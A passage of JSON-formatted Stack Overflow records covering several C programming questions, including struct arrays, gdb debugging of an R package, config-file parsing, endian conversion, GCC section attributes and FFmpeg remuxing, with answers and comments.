}\n}\n</code></pre>\n\n<p>Errors:</p>\n\n<ol>\n<li>Wrong format specifier used in taking integer input in number of Employees.</li>\n<li>Wrong loop variable used in all loops of Employee.</li>\n</ol>\n\n<p>Now this code is working. I've pointed out the errors in the comments also.</p>\n"}], "owner": {"reputation": 13, "user_id": 7488399, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/97c06e9884c702af683be5f964f95561?s=128&d=identicon&r=PG&f=1", "display_name": "Ayaz khan", "link": "https://stackoverflow.com/users/7488399/ayaz-khan"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 151, "favorite_count": 0, "accepted_answer_id": 48826040, "answer_count": 2, "score": -2, "last_activity_date": 1518781349, "creation_date": 1518618237, "last_edit_date": 1518629072, "question_id": 48789485, "link": "https://stackoverflow.com/questions/48789485/how-to-print-all-id-names-in-one-loop", "title": "how to print all id names in one loop?", "body": "<p>This code is about 'struct' in C..</p>\n\n<p>I created a struct  with the properties name,roll etc.. By using the for-loop I let the user to create the struct objects. they are named as student,employee, faculty</p>\n\n<p>the problem is the objects are created. But I can use them only inside the for-loop. If I want to get the value of all names in main function, it doesn't work. How can I solve it?How do i print all names in the code in only one loop\nwhat will be the logic</p>\n\n<pre><code>#include&lt;stdio.h&gt;\n#include&lt;conio.h&gt;  \nstruct student\n{\n    int std;\n    char fee[90];                                 //Collect Data of students\n    int rollno;\n    char name[15];\n    char sub[100];\n};\nmain()\n{\n    int x;\n    printf(\"******Enter the total number of Student from HOD*******:\\n\");\n    scanf(\"%d\",&amp;x);\n    struct student a[x];\n    for(int i=0;i&lt;x;i++)\n    {\n        printf(\"\\nEnter Rollno:\\t\");\n        scanf(\"%d\",&amp;a[x].rollno);\n        printf(\"\\nEnter name:\\t\");\n        scanf(\"%s\",&amp;a[x].name);\n        printf(\"\\nIs Fee Submitted:\\t\");\n        scanf(\"%s\",&amp;a[x].fee);\n        printf(\"\\nEnter Subject name:\\t\");\n        scanf(\"%s\",a[x].sub);\n    }\n    printf(\"\\n****Display All Student names****\");\n    for(int i=0;i&lt;x;i++)\n    {\n        printf(\"\\n%s\",a[x].name);\n    }   \n\n\n    //Faculty \n    struct faculty\n    {\n        char Fname[100];\n        char Sname[100];\n    };\n\n    int y;\n    printf(\"\\n\\n********Please HOD enter the total faculty members********\\n\");\n    scanf(\"%d\",&amp;y);\n    struct faculty b[y];\n    for(int j=0;j&lt;y;j++)\n    {\n        printf(\"\\nEnter Faculty Member Name:\\t\");\n        scanf(\"%s\",&amp;b[y].Fname);\n        printf(\"\\nEnter their Subjects:\\t\");\n        scanf(\"%s\",&amp;b[y].Sname);\n    }\n    printf(\"\\n****Display all Faculty Member Name****\");\n    for(int j=0;j&lt;y;j++)\n    {\n        printf(\"\\n%s\",b[y].Fname);\n    }\n\n    // Employes\n    struct employes\n    {\n        char ename[100];\n        char rank[100];\n    };\n    int z;\n    printf(\"\\n\\n********please HOD enter the total no of Employes*******:\\n\");\n    scanf(\"%s\",&amp;z);\n    struct employes c[z];\n    for(int j=0;j&lt;y;j++)\n    {\n        printf(\"\\nEnter the Employe name:\\t\");\n        scanf(\"%s\",&amp;c[y].ename);\n        printf(\"\\n and enter their ranks:\\t\");\n        scanf(\"%s\",&amp;c[y].rank);\n\n    }\n    printf(\"\\n****Display all Employe names****\");\n    for(int j=0;j&lt;y;j++)\n    {\n        printf(\"%s\\n\",c[y].ename);\n    }\n\n}\n</code></pre>\n"}, {"tags": ["c", "r"], "answers": [{"tags": [], "owner": {"reputation": 691, "user_id": 3390810, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/97216fdd19b7fe2ba6f22a02a36150f6?s=128&d=identicon&r=PG&f=1", "display_name": "sunxd", "link": "https://stackoverflow.com/users/3390810/sunxd"}, "is_accepted": false, "score": 0, "last_activity_date": 1519053075, "creation_date": 1519053075, "answer_id": 48869001, "question_id": 48789330, "link": "https://stackoverflow.com/questions/48789330/debugging-a-c-function-in-a-r-package/48869001#48869001", "title": "Debugging a c function in a R package", "body": "<p>it turns out one must have the source code and compile the R package using specific gcc/cc options.</p>\n"}], "owner": {"reputation": 691, "user_id": 3390810, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/97216fdd19b7fe2ba6f22a02a36150f6?s=128&d=identicon&r=PG&f=1", "display_name": "sunxd", "link": "https://stackoverflow.com/users/3390810/sunxd"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 42, "favorite_count": 0, "answer_count": 1, "score": 1, "last_activity_date": 1519053075, "creation_date": 1518617757, "last_edit_date": 1518618700, "question_id": 48789330, "link": "https://stackoverflow.com/questions/48789330/debugging-a-c-function-in-a-r-package", "title": "Debugging a c function in a R package", "body": "<p>I want to debug the c function of an R package using <code>R -d gdb</code>, but I get the following after setting breakpoint at c function <code>C_MIM()</code>, I got the following information and also \"cannot find bound of the current function\" so I could not print out any variable value in this case. Is there something I am doing wrong? Or for some R package, it is not possible to debug? </p>\n\n<pre><code>Breakpoint 1, 0x00007fffdee0035f in C_MIM ()\n   from /home/sunxd/R/x86_64-pc-linux-gnu-library/3.4/praznik/libs/praznik.so\n(gdb) list\n76      in ../sysdeps/unix/syscall-template.S\n(gdb) n\nSingle stepping until exit from function C_MIM,\nwhich has no line number information.\n^C\nProgram received signal SIGINT, Interrupt.\n[Switching to Thread 0x7fffdddfa700 (LWP 21179)]\n---Type &lt;return&gt; to continue, or q &lt;return&gt; to quit---\n0x00007ffff45c707e in ?? () from /usr/lib/x86_64-linux-gnu/libgomp.so.1\n</code></pre>\n"}, {"tags": ["c", "linux", "configuration-files"], "comments": [{"owner": {"reputation": 22777, "user_id": 133203, "user_type": "registered", "accept_rate": 97, "profile_image": "https://i.stack.imgur.com/Fp3hB.jpg?s=128&g=1", "display_name": "Federico klez Culloca", "link": "https://stackoverflow.com/users/133203/federico-klez-culloca"}, "edited": false, "score": 2, "creation_date": 1518617906, "post_id": 48789310, "comment_id": 84580407, "body": "xml, json, yaml... only half kidding. But don&#39;t overthink it, if you think INI-style is sufficient now I wouldn&#39;t worry too much about it. You can always wrap something around the parser so if you need to change format you just need to change a self-contained part of your program."}, {"owner": {"reputation": 9530, "user_id": 5264491, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/233d38e551f3f0f85437e4ae47353d25?s=128&d=identicon&r=PG&f=1", "display_name": "Ian Abbott", "link": "https://stackoverflow.com/users/5264491/ian-abbott"}, "edited": false, "score": 0, "creation_date": 1518619773, "post_id": 48789310, "comment_id": 84581775, "body": "There&#39;s more than one way to do it. Having said that, I&#39;ve used <a href=\"http://www.hyperrealm.com/oss_libconfig.shtml\" rel=\"nofollow noreferrer\">libconfig</a> successfully in a few projects."}, {"owner": {"reputation": 18759, "user_id": 2226988, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5c6fbec3a71b2e95e4a6e41478deb379?s=128&d=identicon&r=PG", "display_name": "Tom Blodget", "link": "https://stackoverflow.com/users/2226988/tom-blodget"}, "edited": false, "score": 0, "creation_date": 1518629674, "post_id": 48789310, "comment_id": 84588298, "body": "<a href=\"https://en.wikiquote.org/wiki/Andrew_S._Tanenbaum\" rel=\"nofollow noreferrer\">The nice thing about standards is that you have so many to choose from.</a>\u2014Andrew S. Tanenbaum, 1988"}], "answers": [{"comments": [{"owner": {"reputation": 385, "user_id": 7114946, "user_type": "registered", "accept_rate": 100, "profile_image": "https://lh6.googleusercontent.com/-FbfhnUgQmLU/AAAAAAAAAAI/AAAAAAAAARc/EdBSHus7rDU/photo.jpg?sz=128", "display_name": "Daniel Ortega", "link": "https://stackoverflow.com/users/7114946/daniel-ortega"}, "edited": false, "score": 1, "creation_date": 1518682984, "post_id": 48791957, "comment_id": 84608036, "body": "Thank you for your answer.  From it I can conclude that there are no standard libraries or standard methods and procedures using simply flat C in order to do this.  I will go in the way you say, just having a simple text file with some given format, as the configuration to be read is very basic.  Thanks!"}], "tags": [], "owner": {"reputation": 509, "user_id": 8857328, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1a43855efb44db02b57d0f7253394882?s=128&d=identicon&r=PG&f=1", "display_name": "VladP", "link": "https://stackoverflow.com/users/8857328/vladp"}, "is_accepted": true, "score": 1, "last_activity_date": 1518625862, "creation_date": 1518625862, "answer_id": 48791957, "question_id": 48789310, "link": "https://stackoverflow.com/questions/48789310/is-there-a-standard-spreaded-way-to-parse-config-files/48791957#48791957", "title": "Is there a standard spreaded way to parse config files", "body": "<p>Although you may pair the C language with other scripting and parsing languages, like xml, json, yaml, there is a simple standard way that is used by those who want to have C only programming environment. Matter of taste, I guess. You may simply have an ASCII .txt file with predetermined format, read it from C and update it either manually or by some other problem. This is the simplest solution that will be always C compatible.\nHowever, if you want to go json, or yaml, go ahead, by all means. Just keep in mind, that maintenance may be a bit complicated, if your code gets into the hands of someone who does know C, and doesn't know jsom, yaml or xml.\nI hope that this answer your question.</p>\n"}], "owner": {"reputation": 385, "user_id": 7114946, "user_type": "registered", "accept_rate": 100, "profile_image": "https://lh6.googleusercontent.com/-FbfhnUgQmLU/AAAAAAAAAAI/AAAAAAAAARc/EdBSHus7rDU/photo.jpg?sz=128", "display_name": "Daniel Ortega", "link": "https://stackoverflow.com/users/7114946/daniel-ortega"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 61, "favorite_count": 0, "closed_date": 1518643435, "accepted_answer_id": 48791957, "answer_count": 1, "score": 0, "last_activity_date": 1518625862, "creation_date": 1518617687, "question_id": 48789310, "link": "https://stackoverflow.com/questions/48789310/is-there-a-standard-spreaded-way-to-parse-config-files", "closed_reason": "Opinion-based", "title": "Is there a standard spreaded way to parse config files", "body": "<p>I want to create a configuration file for my program in C.</p>\n\n<p>I know how I can do this and the problem is I have several ideas in my mind.</p>\n\n<p>I was researching but I cannot find any generalized standard way to create and parse config files, so I am afraid that I will just create a file with some kind of structure like this:</p>\n\n<pre><code># Section1\nSTRING_parameter1          Value1\nSTRING_parameter2          Value2\n\n# Section2\nSTRING_other_parameter1    Value3\nSTRING_other_parameter2    Value4\n\n        ...\n\n        etc\n</code></pre>\n\n<p>And then just parse the file from the different modules, every section in a normal way.</p>\n\n<p>But I am afraid I can come out with some long term problems that only experience can teach and then to have to modify this structure.</p>\n\n<p>That is why I would like to know if there is a better way to do this in order to avoid future issues.</p>\n"}, {"tags": ["c", "arrays", "pointers"], "comments": [{"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1518616953, "post_id": 48789044, "comment_id": 84579737, "body": "Is this code written by you?"}, {"owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 1, "creation_date": 1518617120, "post_id": 48789044, "comment_id": 84579853, "body": "In order to make some sense from this, we&#39;d need to know the various type definitions. Is this an array of 32 bit integers or is it something else?"}, {"owner": {"reputation": 315, "user_id": 7762652, "user_type": "registered", "accept_rate": 12, "profile_image": "https://www.gravatar.com/avatar/f7cac3a546a55e49ed85ed343290e606?s=128&d=identicon&r=PG&f=1", "display_name": "nice_remark", "link": "https://stackoverflow.com/users/7762652/nice-remark"}, "edited": false, "score": 0, "creation_date": 1518617329, "post_id": 48789044, "comment_id": 84580012, "body": "Its just a pointer. but i fixed it by uncommenting out the the second for loop and adding <code>data_bytes[3-i] = buf[i+cnt]</code>"}, {"owner": {"reputation": 121127, "user_id": 388520, "user_type": "registered", "accept_rate": 51, "profile_image": "https://www.gravatar.com/avatar/dd7cc06b1b1c347e172c6ba532937173?s=128&d=identicon&r=PG", "display_name": "zwol", "link": "https://stackoverflow.com/users/388520/zwol"}, "edited": false, "score": 0, "creation_date": 1518618014, "post_id": 48789044, "comment_id": 84580490, "body": "As shown, why do you need <code>data_bytes</code> at all?  It&#39;s not initialized to anything, so why not eliminate it entirely and just feed <code>buf[i]</code> directly to <code>printf</code>?"}, {"owner": {"reputation": 66473, "user_id": 694576, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/PpOGj.jpg?s=128&g=1", "display_name": "alk", "link": "https://stackoverflow.com/users/694576/alk"}, "reply_to_user": {"reputation": 121127, "user_id": 388520, "user_type": "registered", "accept_rate": 51, "profile_image": "https://www.gravatar.com/avatar/dd7cc06b1b1c347e172c6ba532937173?s=128&d=identicon&r=PG", "display_name": "zwol", "link": "https://stackoverflow.com/users/388520/zwol"}, "edited": false, "score": 1, "creation_date": 1518618488, "post_id": 48789044, "comment_id": 84580814, "body": "@zwol .... not to mention that the current <code>data_bytes[blabla] = ...</code> provokes the infamouse Undefined Behaviour by writing to invalid memory."}, {"owner": {"reputation": 315, "user_id": 7762652, "user_type": "registered", "accept_rate": 12, "profile_image": "https://www.gravatar.com/avatar/f7cac3a546a55e49ed85ed343290e606?s=128&d=identicon&r=PG&f=1", "display_name": "nice_remark", "link": "https://stackoverflow.com/users/7762652/nice-remark"}, "edited": false, "score": 0, "creation_date": 1518618626, "post_id": 48789044, "comment_id": 84580935, "body": "I tried that but the first value got changed, no idea why that occurred. Actually it occurred because the the moments the bytes switch with <code>buf[3-1] = buf[i+cnt]</code> they will begin repeating"}, {"owner": {"reputation": 509, "user_id": 8857328, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1a43855efb44db02b57d0f7253394882?s=128&d=identicon&r=PG&f=1", "display_name": "VladP", "link": "https://stackoverflow.com/users/8857328/vladp"}, "edited": false, "score": 0, "creation_date": 1518797797, "post_id": 48789044, "comment_id": 84665542, "body": "More search on stackoverflow would give answers: <a href=\"https://stackoverflow.com/questions/2182002/convert-big-endian-to-little-endian-in-c-without-using-provided-func\" title=\"convert big endian to little endian in c without using provided func\">stackoverflow.com/questions/2182002/&hellip;</a>"}], "owner": {"reputation": 315, "user_id": 7762652, "user_type": "registered", "accept_rate": 12, "profile_image": "https://www.gravatar.com/avatar/f7cac3a546a55e49ed85ed343290e606?s=128&d=identicon&r=PG&f=1", "display_name": "nice_remark", "link": "https://stackoverflow.com/users/7762652/nice-remark"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 395, "favorite_count": 0, "answer_count": 0, "score": 1, "last_activity_date": 1518616864, "creation_date": 1518616864, "question_id": 48789044, "link": "https://stackoverflow.com/questions/48789044/converting-array-of-bytes-from-big-endian-to-little-endian", "title": "Converting array of bytes from big endian to little endian?", "body": "<p>My program dumps an a bunch of bytes in a long array which is big endian, my goal is to split up the bytes into double words (groups of 4 bytes) and put them in little endian format. Here is the code that I have gotten thus far:</p>\n\n<pre><code>int print_got_bytes(struct _section *got_section, Elf_Data *data) {\n    size_t size = data-&gt;d_size;\n    off_t offset = data-&gt;d_off;\n    unsigned char *buf = (unsigned char *) data-&gt;d_buf;\n\n    unsigned char *data_bytes;\n    printf(\"%ld\\n\", size);\n\n    //for(int cnt = 0; cnt &lt; size; cnt += 4) {\n        for(int i = 3; i &gt;= 0; i--) {\n            data_bytes[3 - i] = buf[i];\n            printf(\"%02x\", data_bytes[3 - i]);\n        }\n    //}\n    puts(\"\");\n    return 0;\n}\n</code></pre>\n\n<p>So far this works for the first set of bytes, but I cannot figure out how to increment the pointer <code>data_bytes</code> and repeat the process for the next set of bytes. Is this the wrong method of going about solving this problem?</p>\n"}, {"tags": ["c", "gcc", "attributes", "ld"], "answers": [{"tags": [], "owner": {"reputation": 121127, "user_id": 388520, "user_type": "registered", "accept_rate": 51, "profile_image": "https://www.gravatar.com/avatar/dd7cc06b1b1c347e172c6ba532937173?s=128&d=identicon&r=PG", "display_name": "zwol", "link": "https://stackoverflow.com/users/388520/zwol"}, "is_accepted": true, "score": 1, "last_activity_date": 1518627950, "last_edit_date": 1518627950, "creation_date": 1518627609, "answer_id": 48792513, "question_id": 48788997, "link": "https://stackoverflow.com/questions/48788997/gcc-variable-with-attribute-is-treated-like-an-initialized/48792513#48792513", "title": "GCC variable with __attribute__ is treated like an initialized", "body": "<blockquote>\n<pre><code>static unsigned char array[1024] __attribute__((section (\".section_i\")));\n</code></pre>\n  \n  <p>The above declaration will increase the data size by 1k even though I have not initialized the array. How can I mark the variable as not initialized to avoid the increasing of data section?</p>\n</blockquote>\n\n<p>OK, this is not actually about \"initialized\" or \"not initialized\"; this is about whether or not the variable is treated as \"common\", not requiring preallocated space in the data <em>segment</em> of the executable image.  (Unlinked object files have sections; fully linked executables and shared libraries have segments.)</p>\n\n<p><a href=\"https://gcc.gnu.org/onlinedocs/gcc-7.3.0/gcc/Common-Variable-Attributes.html#Common-Variable-Attributes\" rel=\"nofollow noreferrer\">https://gcc.gnu.org/onlinedocs/gcc-7.3.0/gcc/Common-Variable-Attributes.html#Common-Variable-Attributes</a> <em>says</em> that this is controlled with the \"common\" attribute, so</p>\n\n<pre><code>static unsigned char array[1024] __attribute((section(\".section_i\"), common));\n</code></pre>\n\n<p>is documented to do what you want (provided that your linker script cooperates; the section named <code>.section_i</code> must be put into the appropriate segment; for historical reasons, the name of that segment is probably \"BSS\").  However, when I actually try that with the compiler I have to hand (which is indeed GCC 7.3, native compiler for x86_64-Linux) it generates assembly language that might not do the right thing.  You should try it with your compiler anyway; it is probable that this is just a plain old bug in the x86-64 back end, and one that may not be duplicated in the back end for whatever embedded environment you're working with.</p>\n\n<p>Note that you should inspect a fully linked executable image before concluding that this does not work.  It's possible that the variable will take up space in the <em>object file</em> that defines it, but not in the executable.</p>\n\n<p>For incredibly stupid reasons that I regret I even know about and do not want to attempt to explain, it may also help to call the section <code>.bss.section_i</code> instead of just <code>.section_i</code>.  This may also make it easier to write the linker script.</p>\n"}], "owner": {"reputation": 673, "user_id": 4910008, "user_type": "registered", "accept_rate": 93, "profile_image": "https://www.gravatar.com/avatar/5f23b3d24343abf121af99ef91515aa2?s=128&d=identicon&r=PG&f=1", "display_name": "David", "link": "https://stackoverflow.com/users/4910008/david"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1013, "favorite_count": 1, "accepted_answer_id": 48792513, "answer_count": 1, "score": 0, "last_activity_date": 1518627950, "creation_date": 1518616736, "last_edit_date": 1518620408, "question_id": 48788997, "link": "https://stackoverflow.com/questions/48788997/gcc-variable-with-attribute-is-treated-like-an-initialized", "title": "GCC variable with __attribute__ is treated like an initialized", "body": "<p>If I use the <code>__attribute__(section(\".section_i\"))</code>, the variable is treated as an initialized variable.\nLet's take a quick look at the following example(declared as global variable):</p>\n\n<pre><code> static unsigned char array[1024] __attribute__((section (\".section_i\")));\n</code></pre>\n\n<p>The above declaration will increase the data size by 1k even though I have not initialized the array.\nHow can I mark the <strong>variable</strong> as not initialized to avoid the increasing of data section?</p>\n"}, {"tags": ["c", "video", "ffmpeg"], "comments": [{"owner": {"reputation": 23582, "user_id": 758133, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/W8X5E.jpg?s=128&g=1", "display_name": "Martin James", "link": "https://stackoverflow.com/users/758133/martin-james"}, "edited": false, "score": 0, "creation_date": 1518616131, "post_id": 48788630, "comment_id": 84579163, "body": "Code please, in question."}, {"owner": {"reputation": 305, "user_id": 3360601, "user_type": "registered", "accept_rate": 70, "profile_image": "https://www.gravatar.com/avatar/d79fbdac0390c98c2ea588d1fe64e120?s=128&d=identicon&r=PG&f=1", "display_name": "user3360601", "link": "https://stackoverflow.com/users/3360601/user3360601"}, "reply_to_user": {"reputation": 23582, "user_id": 758133, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/W8X5E.jpg?s=128&g=1", "display_name": "Martin James", "link": "https://stackoverflow.com/users/758133/martin-james"}, "edited": false, "score": 0, "creation_date": 1518616593, "post_id": 48788630, "comment_id": 84579512, "body": "@MartinJames, updated question with code."}, {"owner": {"reputation": 19142, "user_id": 334402, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/476b932160cd12fa0e4515a313427679?s=128&d=identicon&r=PG", "display_name": "Mick", "link": "https://stackoverflow.com/users/334402/mick"}, "edited": false, "score": 1, "creation_date": 1518628266, "post_id": 48788630, "comment_id": 84587610, "body": "Is there are reason to do this via ffmpeg - i.e. could you simply duplicate the file and rename the copy at the file system level, if you want an exact copy?"}], "answers": [{"comments": [{"owner": {"reputation": 305, "user_id": 3360601, "user_type": "registered", "accept_rate": 70, "profile_image": "https://www.gravatar.com/avatar/d79fbdac0390c98c2ea588d1fe64e120?s=128&d=identicon&r=PG&f=1", "display_name": "user3360601", "link": "https://stackoverflow.com/users/3360601/user3360601"}, "edited": false, "score": 0, "creation_date": 1518698400, "post_id": 48792818, "comment_id": 84617786, "body": "szatmary, @Mick, If not likely, then ok."}], "tags": [], "owner": {"reputation": 27067, "user_id": 210785, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a561cd4d29738e18d9e565a6265d86ac?s=128&d=identicon&r=PG", "display_name": "szatmary", "link": "https://stackoverflow.com/users/210785/szatmary"}, "is_accepted": true, "score": 0, "last_activity_date": 1518628544, "creation_date": 1518628544, "answer_id": 48792818, "question_id": 48788630, "link": "https://stackoverflow.com/questions/48788630/how-can-i-copy-file-frame-by-frame-to-get-exactly-the-same-file-ffmpeg/48792818#48792818", "title": "how can I copy file frame by frame to get exactly the same file? (FFmpeg)", "body": "<p>Not likely. It\u2019s possible if ffmpeg was used to produce the original. But if the original and remux were produced with different tools, it\u2019s almost certainly be a few bytes different. Luckily your computer comes with a tool to do this, just make a copy of the file. </p>\n"}], "owner": {"reputation": 305, "user_id": 3360601, "user_type": "registered", "accept_rate": 70, "profile_image": "https://www.gravatar.com/avatar/d79fbdac0390c98c2ea588d1fe64e120?s=128&d=identicon&r=PG&f=1", "display_name": "user3360601", "link": "https://stackoverflow.com/users/3360601/user3360601"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 206, "favorite_count": 0, "accepted_answer_id": 48792818, "answer_count": 1, "score": 0, "last_activity_date": 1518628544, "creation_date": 1518615646, "last_edit_date": 1518616547, "question_id": 48788630, "link": "https://stackoverflow.com/questions/48788630/how-can-i-copy-file-frame-by-frame-to-get-exactly-the-same-file-ffmpeg", "title": "how can I copy file frame by frame to get exactly the same file? (FFmpeg)", "body": "<p>I was using an ffmpeg example from original source <a href=\"https://ffmpeg.org/doxygen/2.7/remuxing_8c-example.html\" rel=\"nofollow noreferrer\">remuxing.c</a> to copy file by frames. It works, but the result file has another structure inside. <a href=\"https://i.stack.imgur.com/Ge1Ra.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/Ge1Ra.png\" alt=\"enter image description here\"></a></p>\n\n<p>From the left is original file. It has \"framerate\" field. Moreover, the copy file has smaller size. On 18 bytes less.</p>\n\n<p>Question: how can I copy file frame by frame to get exactly the same file? Including \"framerate\" field and total size?</p>\n\n<p>Code from the source site.</p>\n\n<pre><code>    /*\n * Copyright (c) 2013 Stefano Sabatini\n *\n * Permission is hereby granted, free of charge, to any person obtaining a copy\n * of this software and associated documentation files (the \"Software\"), to deal\n * in the Software without restriction, including without limitation the rights\n * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell\n * copies of the Software, and to permit persons to whom the Software is\n * furnished to do so, subject to the following conditions:\n *\n * The above copyright notice and this permission notice shall be included in\n * all copies or substantial portions of the Software.\n *\n * THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL\n * THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n * THE SOFTWARE.\n */\n\n/**\n * @file\n * libavformat/libavcodec demuxing and muxing API example.\n *\n * Remux streams from one container format to another.\n * @example remuxing.c\n */\n\n#include &lt;libavutil/timestamp.h&gt;\n#include &lt;libavformat/avformat.h&gt;\n\nstatic void log_packet(const AVFormatContext *fmt_ctx, const AVPacket *pkt, const char *tag)\n{\n    AVRational *time_base = &amp;fmt_ctx-&gt;streams[pkt-&gt;stream_index]-&gt;time_base;\n\n    printf(\"%s: pts:%s pts_time:%s dts:%s dts_time:%s duration:%s duration_time:%s stream_index:%d\\n\",\n           tag,\n           av_ts2str(pkt-&gt;pts), av_ts2timestr(pkt-&gt;pts, time_base),\n           av_ts2str(pkt-&gt;dts), av_ts2timestr(pkt-&gt;dts, time_base),\n           av_ts2str(pkt-&gt;duration), av_ts2timestr(pkt-&gt;duration, time_base),\n           pkt-&gt;stream_index);\n}\n\nint main(int argc, char **argv)\n{\n    AVOutputFormat *ofmt = NULL;\n    AVFormatContext *ifmt_ctx = NULL, *ofmt_ctx = NULL;\n    AVPacket pkt;\n    const char *in_filename, *out_filename;\n    int ret, i;\n    int stream_index = 0;\n    int *stream_mapping = NULL;\n    int stream_mapping_size = 0;\n\n    if (argc &lt; 3) {\n        printf(\"usage: %s input output\\n\"\n               \"API example program to remux a media file with libavformat and libavcodec.\\n\"\n               \"The output format is guessed according to the file extension.\\n\"\n               \"\\n\", argv[0]);\n        return 1;\n    }\n\n    in_filename  = argv[1];\n    out_filename = argv[2];\n\n    av_register_all();\n\n    if ((ret = avformat_open_input(&amp;ifmt_ctx, in_filename, 0, 0)) &lt; 0) {\n        fprintf(stderr, \"Could not open input file '%s'\", in_filename);\n        goto end;\n    }\n\n    if ((ret = avformat_find_stream_info(ifmt_ctx, 0)) &lt; 0) {\n        fprintf(stderr, \"Failed to retrieve input stream information\");\n        goto end;\n    }\n\n    av_dump_format(ifmt_ctx, 0, in_filename, 0);\n\n    avformat_alloc_output_context2(&amp;ofmt_ctx, NULL, NULL, out_filename);\n    if (!ofmt_ctx) {\n        fprintf(stderr, \"Could not create output context\\n\");\n        ret = AVERROR_UNKNOWN;\n        goto end;\n    }\n\n    stream_mapping_size = ifmt_ctx-&gt;nb_streams;\n    stream_mapping = av_mallocz_array(stream_mapping_size, sizeof(*stream_mapping));\n    if (!stream_mapping) {\n        ret = AVERROR(ENOMEM);\n        goto end;\n    }\n\n    ofmt = ofmt_ctx-&gt;oformat;\n\n    for (i = 0; i &lt; ifmt_ctx-&gt;nb_streams; i++) {\n        AVStream *out_stream;\n        AVStream *in_stream = ifmt_ctx-&gt;streams[i];\n        AVCodecParameters *in_codecpar = in_stream-&gt;codecpar;\n\n        if (in_codecpar-&gt;codec_type != AVMEDIA_TYPE_AUDIO &amp;&amp;\n            in_codecpar-&gt;codec_type != AVMEDIA_TYPE_VIDEO &amp;&amp;\n            in_codecpar-&gt;codec_type != AVMEDIA_TYPE_SUBTITLE) {\n            stream_mapping[i] = -1;\n            continue;\n        }\n\n        stream_mapping[i] = stream_index++;\n\n        out_stream = avformat_new_stream(ofmt_ctx, NULL);\n        if (!out_stream) {\n            fprintf(stderr, \"Failed allocating output stream\\n\");\n            ret = AVERROR_UNKNOWN;\n            goto end;\n        }\n\n        ret = avcodec_parameters_copy(out_stream-&gt;codecpar, in_codecpar);\n        if (ret &lt; 0) {\n            fprintf(stderr, \"Failed to copy codec parameters\\n\");\n            goto end;\n        }\n        out_stream-&gt;codecpar-&gt;codec_tag = 0;\n    }\n    av_dump_format(ofmt_ctx, 0, out_filename, 1);\n\n    if (!(ofmt-&gt;flags &amp; AVFMT_NOFILE)) {\n        ret = avio_open(&amp;ofmt_ctx-&gt;pb, out_filename, AVIO_FLAG_WRITE);\n        if (ret &lt; 0) {\n            fprintf(stderr, \"Could not open output file '%s'\", out_filename);\n            goto end;\n        }\n    }\n\n    ret = avformat_write_header(ofmt_ctx, NULL);\n    if (ret &lt; 0) {\n        fprintf(stderr, \"Error occurred when opening output file\\n\");\n        goto end;\n    }\n\n    while (1) {\n        AVStream *in_stream, *out_stream;\n\n        ret = av_read_frame(ifmt_ctx, &amp;pkt);\n        if (ret &lt; 0)\n            break;\n\n        in_stream  = ifmt_ctx-&gt;streams[pkt.stream_index];\n        if (pkt.stream_index &gt;= stream_mapping_size ||\n            stream_mapping[pkt.stream_index] &lt; 0) {\n            av_packet_unref(&amp;pkt);\n            continue;\n        }\n\n        pkt.stream_index = stream_mapping[pkt.stream_index];\n        out_stream = ofmt_ctx-&gt;streams[pkt.stream_index];\n        log_packet(ifmt_ctx, &amp;pkt, \"in\");\n\n        /* copy packet */\n        pkt.pts = av_rescale_q_rnd(pkt.pts, in_stream-&gt;time_base, out_stream-&gt;time_base, AV_ROUND_NEAR_INF|AV_ROUND_PASS_MINMAX);\n        pkt.dts = av_rescale_q_rnd(pkt.dts, in_stream-&gt;time_base, out_stream-&gt;time_base, AV_ROUND_NEAR_INF|AV_ROUND_PASS_MINMAX);\n        pkt.duration = av_rescale_q(pkt.duration, in_stream-&gt;time_base, out_stream-&gt;time_base);\n        pkt.pos = -1;\n        log_packet(ofmt_ctx, &amp;pkt, \"out\");\n\n        ret = av_interleaved_write_frame(ofmt_ctx, &amp;pkt);\n        if (ret &lt; 0) {\n            fprintf(stderr, \"Error muxing packet\\n\");\n            break;\n    